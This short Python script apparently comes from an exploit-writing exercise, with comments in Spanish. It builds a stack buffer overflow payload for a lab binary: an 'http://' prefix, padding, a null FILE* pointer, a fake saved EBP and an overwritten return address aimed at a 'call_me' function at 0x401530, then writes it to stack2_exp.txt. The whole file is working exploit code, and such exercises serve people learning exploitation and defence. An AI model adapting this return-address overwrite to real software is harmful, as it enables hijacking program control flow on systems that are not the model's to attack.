import os, subprocess
import struct

call_me = 0x401530
f = open('stack2_exp.txt', 'wb')

payload = "http://"
payload += 13*'X' # relleno 
payload += struct.pack("<I", 0x0)  # FILE* a null
payload += 8*'X' # relleno
payload += 4*'A' # ebp
payload += struct.pack("<I", call_me) #eip

f.write(payload)
f.close()
